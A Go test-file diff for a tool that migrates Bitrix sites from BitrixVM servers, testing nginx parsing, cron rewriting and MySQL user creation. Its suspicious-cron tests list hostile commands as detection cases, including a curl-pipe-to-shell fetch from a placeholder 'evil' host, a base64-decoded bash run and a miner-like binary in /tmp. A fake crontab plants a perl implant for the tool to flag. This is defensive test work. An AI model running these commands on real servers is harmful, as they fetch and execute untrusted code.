@@ -187,6 +187,15 @@ func (f *fakeSSH) command(prefix string) string {
 	return ""
 }
 
+func hasNote(notes []string, part string) bool {
+	for _, n := range notes {
+		if strings.Contains(n, part) {
+			return true
+		}
+	}
+	return false
+}
+
 func sortStrings(s []string) {
 	for i := range s {
 		for j := i + 1; j < len(s); j++ {
@@ -262,6 +271,10 @@ func TestForeignHelpers(t *testing.T) {
 	if root != "/home/bitrix/ext_www/shop.example.com" || strings.Join(names, ",") != "shop.example.com,www.shop.example.com,alias.example.com" || cert != "/etc/nginx/certs/a.crt" || key != "/etc/nginx/certs/a.key" {
 		t.Errorf("nginx: %s %v %s %s", root, names, cert, key)
 	}
+	root, _, cert, key = parseNginxServer("server {\n  root \"/home/bitrix/ext_www/gulmart.kz\";\n  ssl_certificate '/etc/nginx/ssl/my cert.pem';\n  ssl_certificate_key \"/etc/nginx/ssl/key.pem\";\n}\n")
+	if root != "/home/bitrix/ext_www/gulmart.kz" || cert != "/etc/nginx/ssl/my cert.pem" || key != "/etc/nginx/ssl/key.pem" {
+		t.Errorf("nginx в кавычках: %s %s %s", root, cert, key)
+	}
 	main, aliases := hostDomains([]string{"www.shop.example.com", "shop.example.com", "_", "alias.example.com", "www.shop.example.com"})
 	if main != "shop.example.com" || strings.Join(aliases, ",") != "alias.example.com" {
 		t.Errorf("hostDomains: %s %v", main, aliases)
@@ -275,11 +288,56 @@ func TestForeignHelpers(t *testing.T) {
 	if len(jobs) != 2 || jobs[0].Command != "/usr/bin/php -f /var/www/bitrix/data/www/main.example.com/bitrix/modules/main/tools/cron_events.php" || jobs[0].Comment != "agents" || jobs[1].Schedule != "@daily" || jobs[1].Command != "rm -rf /var/www/bitrix/.bx_temp/*" {
 		t.Errorf("crontab: %+v %+v", jobs[0], jobs[1])
 	}
+	for cmd, want := range map[string]bool{
+		"perl /var/tmp/LLVPnNU":                     true,
+		"/tmp/.x/kswapd0 >/dev/null 2>&1":           true,
+		"cd /tmp; nohup /dev/shm/run &":             true,
+		"curl -fsSL http://evil.example/x | sh":     true,
+		"echo aGk= | base64 -d | bash":              true,
+		"rm -rf /tmp/php_sessions/*":                false,
+		"php -f /home/bitrix/www/bitrix/tools.php":  false,
+		"wget -q -O /dev/null https://example.com/": false,
+	} {
+		if got := suspiciousCron(cmd); got != want {
+			t.Errorf("suspiciousCron(%q) = %v", cmd, got)
+		}
+	}
+	for in, want := range map[string]string{
+		"/usr/bin/php -f /x.php":            "php -f /x.php",
+		"cd /x && /usr/local/bin/php a.php": "cd /x && php a.php",
+		"/usr/bin/php5.6 a.php":             "/usr/bin/php5.6 a.php",
+	} {
+		if got := bxCronPHP(in); got != want {
+			t.Errorf("bxCronPHP(%q) = %q", in, got)
+		}
+	}
 	if got := f.rewriteText(`define("BX_TEMPORARY_FILES_DIRECTORY", "/home/bitrix/.bx_temp/sitemanager");`); !strings.Contains(got, `"/var/www/bitrix/.bx_temp/sitemanager"`) {
 		t.Errorf("rewriteText: %s", got)
 	}
 	if got := f.rewriteText(`'root' => '/home/bitrix/www',`); !strings.Contains(got, `'/var/www/bitrix/data/www/main.example.com'`) {
 		t.Errorf("rewriteText exact: %s", got)
+	}
+}
+
+// A plain password gets its plugin named: the server default would lock
+// PHP below 7.4 out.
+func TestPinAuthPlugin(t *testing.T) {
+	plain := "CREATE USER IF NOT EXISTS 'a'@'localhost' IDENTIFIED BY 'p''w'"
+	if got := pinAuthPlugin(plain, true); got != "CREATE USER IF NOT EXISTS 'a'@'localhost' IDENTIFIED WITH mysql_native_password BY 'p''w'" || createUserPlugin(got) != "mysql_native_password" {
+		t.Errorf("legacy: %s", got)
+	}
+	if got := pinAuthPlugin(plain, false); createUserPlugin(got) != "caching_sha2_password" || !strings.Contains(got, "IDENTIFIED WITH caching_sha2_password BY 'p''w'") {
+		t.Errorf("modern: %s", got)
+	}
+	hash := "CREATE USER 'a'@'localhost' IDENTIFIED WITH 'mysql_native_password' AS '*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29' REQUIRE NONE"
+	if got := pinAuthPlugin(hash, false); got != hash || createUserPlugin(got) != "mysql_native_password" {
+		t.Errorf("hash: %s", got)
+	}
+	if v := legacyPHP([]*store.Site{{PHPVersion: "8.3"}, {PHPVersion: "7.0"}, {PHPVersion: "5.6"}, {}}); v != "5.6" {
+		t.Errorf("legacyPHP: %q", v)
+	}
+	if v := legacyPHP([]*store.Site{{PHPVersion: "7.4"}}); v != "" {
+		t.Errorf("legacyPHP 7.4: %q", v)
 	}
 }
 
@@ -296,17 +354,20 @@ func TestMigrationFromBitrixVM(t *testing.T) {
 	remote.links["/home/bitrix/ext_www/shop.example.com/bitrix"] = true
 	remote.dirs["/home/bitrix/ext_www/shop.example.com/bitrix"] = true
 	remote.files["/etc/nginx/bx/site_enabled/s1.conf"] = "server {\n listen 80 default_server;\n server_name _;\n root /home/bitrix/www;\n}\n"
-	remote.files["/etc/nginx/bx/site_enabled/bx_ext_shop.example.com.conf"] = "server {\n listen 80;\n server_name shop.example.com www.shop.example.com;\n root /home/bitrix/ext_www/shop.example.com;\n}\n"
+	remote.files["/etc/nginx/bx/site_enabled/bx_ext_shop.example.com.conf"] = "server {\n listen 80;\n server_name shop.example.com www.shop.example.com;\n root \"/home/bitrix/ext_www/shop.example.com\";\n}\n"
+	remote.files["/etc/nginx/bx/site_enabled/bx_ext_other.conf"] = "server {\n listen 80;\n server_name other.example.com;\n root /var/www/other;\n}\n"
 	remote.files["/etc/nginx/bx/site_enabled/rtc.conf"] = "server {\n listen 8893;\n server_name _;\n}\n"
 	settings := "<?php\nreturn array(\n 'connections' => array('value' => array('default' => array(\n  'className' => '\\\\Bitrix\\\\Main\\\\DB\\\\MysqliConnection',\n  'host' => 'localhost',\n  'database' => 'sitemanager',\n  'login' => 'shop_u',\n  'password' => 'pl4in-P@ss',\n ))),\n);\n"
-	remote.files["/home/bitrix/www/bitrix/.settings.php"] = settings
+	remote.files["/home/bitrix/www/bitrix/.settings.php"] = settings + "// 'cache' => array('value' => array('type' => array('class_name' => 'CPHPCacheMemcacheCluster', 'extension' => 'memcache')))\n"
 	remote.files["/home/bitrix/ext_www/shop.example.com/bitrix/.settings.php"] = settings
 	remote.answers["php -r"] = "8.4"
 	remote.answers["getent passwd 'bitrix'"] = "bitrix:x:600:600::/home/bitrix:/bin/bash\n"
 	remote.answers["getent shadow 'bitrix'"] = "bitrix:$6$salt$bitrixhash:19000::::::\n"
 	remote.answers["hostname"] = "vm.bitrix.local\n"
 	remote.answers["rpm -q"] = "9.0.8"
-	remote.answers["crontab -l -u 'bitrix'"] = "*/5 * * * * /usr/bin/php -f /home/bitrix/www/bitrix/modules/main/tools/cron_events.php\n"
+	remote.answers["crontab -l -u 'bitrix'"] = "*/5 * * * * /usr/bin/php -f /home/bitrix/www/bitrix/modules/main/tools/cron_events.php\n*/5 * * * * perl /var/tmp/LLVPnNU\n"
+	remote.answers["crontab -l -u root"] = "# экспорт\n0 3 * * * php /home/bitrix/www/export/export-csv.php\n*/5 * * * * /usr/bin/php -f /home/bitrix/www/bitrix/modules/main/tools/cron_events.php\n@daily /opt/webdir/bin/bx-backup\n"
+	remote.answers["cd '/home/bitrix/www' && { find "] = "./export/export-csv.php\n"
 	mysqlAnswers(remote, "2048")
 	inner := remote.handler
 	remote.handler = func(cmd string) (string, int) {
@@ -330,6 +391,9 @@ func TestMigrationFromBitrixVM(t *testing.T) {
 	target.agent.RunAsHook = func(req agent.RunAsUserRequest) *agent.RunAsUserResponse {
 		if len(req.Args) == 2 && req.Args[0] == "read" && req.Args[1] == "data/www/main.example.com/bitrix/php_interface/dbconn.php" {
 			return &agent.RunAsUserResponse{StdoutBase64: base64.StdEncoding.EncodeToString([]byte(`define("BX_TEMPORARY_FILES_DIRECTORY", "/home/bitrix/.bx_temp/sitemanager");`))}
+		}
+		if len(req.Args) == 2 && req.Args[0] == "read" && req.Args[1] == "data/www/main.example.com/export/export-csv.php" {
+			return &agent.RunAsUserResponse{StdoutBase64: base64.StdEncoding.EncodeToString([]byte(`<? $f = fopen("/home/bitrix/www/export/export.csv", "w");`))}
 		}
 		if len(req.Args) == 2 && req.Args[0] == "write" {
 			raw, _ := base64.StdEncoding.DecodeString(req.StdinBase64)
@@ -384,14 +448,22 @@ func TestMigrationFromBitrixVM(t *testing.T) {
 	if b.Panel != "BitrixVM 9.0.8" || b.Family != "rhel" || len(b.Sites) != 2 || b.Sites[0].Domain != "main.example.com" || b.Sites[1].Domain != "shop.example.com" {
 		t.Fatalf("сайты: %s %s %+v", b.Panel, b.Family, b.Sites)
 	}
+	if !hasNote(b.Notes, "bx_ext_other.conf пропущен: root /var/www/other вне /home/bitrix") {
+		t.Errorf("пропущенный сайт не упомянут: %q", b.Notes)
+	}
 	if b.Sites[0].Preset != "bitrix" || b.Sites[0].PHPVersion != "8.4" {
 		t.Errorf("пресет/PHP: %+v", b.Sites[0])
 	}
 	if len(b.Databases) != 1 || b.Databases[0].Name != "sitemanager" || len(b.Databases[0].Users) != 1 || b.Databases[0].Users[0].Host != "localhost" {
 		t.Errorf("базы: %+v", b.Databases)
 	}
-	if len(b.Cron) != 1 || !strings.Contains(b.Cron[0].Command, target.s.cfg.WWWRoot+"/bitrix/data/www/main.example.com/bitrix/modules") {
+	if len(b.Cron) != 3 || b.Cron[0].Command != "php -f "+target.s.cfg.WWWRoot+"/bitrix/data/www/main.example.com/bitrix/modules/main/tools/cron_events.php" || b.Cron[2].Command != "php "+target.s.cfg.WWWRoot+"/bitrix/data/www/main.example.com/export/export-csv.php" {
 		t.Errorf("cron не переписан: %+v", b.Cron)
+	}
+	for _, want := range []string{"из crontab root перенесено заданий: 1", "@daily /opt/webdir/bin/bx-backup", "perl /var/tmp/LLVPnNU» похоже на чужую закладку", "кеш Битрикса — CPHPCacheMemcacheCluster", "/home/bitrix/www/export/export-csv.php — перепишется"} {
+		if !hasNote(b.Notes, want) {
+			t.Errorf("в разборе нет %q: %q", want, b.Notes)
+		}
 	}
 	if b.Secrets != nil {
 		t.Error("разбор не должен нести секреты")
@@ -434,7 +506,7 @@ func TestMigrationFromBitrixVM(t *testing.T) {
 	// The database comes back with its plain password, not a hash.
 	var created bool
 	for _, sql := range mysqlSQL {
-		if strings.Contains(sql, "CREATE USER IF NOT EXISTS 'shop_u'@'localhost' IDENTIFIED BY 'pl4in-P@ss'") && strings.Contains(sql, "GRANT ALL PRIVILEGES ON `sitemanager`.*") {
+		if strings.Contains(sql, "CREATE USER IF NOT EXISTS 'shop_u'@'localhost' IDENTIFIED WITH caching_sha2_password BY 'pl4in-P@ss'") && strings.Contains(sql, "GRANT ALL PRIVILEGES ON `sitemanager`.*") {
 			created = true
 		}
 	}
@@ -465,9 +537,12 @@ func TestMigrationFromBitrixVM(t *testing.T) {
 	if got := written["data/www/main.example.com/bitrix/php_interface/dbconn.php"]; !strings.Contains(got, target.s.cfg.WWWRoot+"/bitrix/.bx_temp/sitemanager") {
 		t.Errorf("dbconn.php не переписан: %q", got)
 	}
+	if got := written["data/www/main.example.com/export/export-csv.php"]; !strings.Contains(got, `"`+target.s.cfg.WWWRoot+"/bitrix/data/www/main.example.com/export/export.csv") {
+		t.Errorf("скрипт с /home/bitrix не переписан: %q", got)
+	}
 	cron, _ := target.db.ListCronJobs(target.ctx, u.ID)
-	if len(cron) != 1 || !strings.Contains(cron[0].Command, "/bitrix/data/www/main.example.com/") {
-		t.Errorf("cron: %+v", cron)
+	if len(cron) != 3 || !strings.Contains(cron[0].Command, "/bitrix/data/www/main.example.com/") || cron[1].Enabled || !cron[2].Enabled || cron[2].Comment != "из crontab root; экспорт" {
+		t.Errorf("cron: %+v %+v %+v", cron[0], cron[1], cron[2])
 	}
 }
 
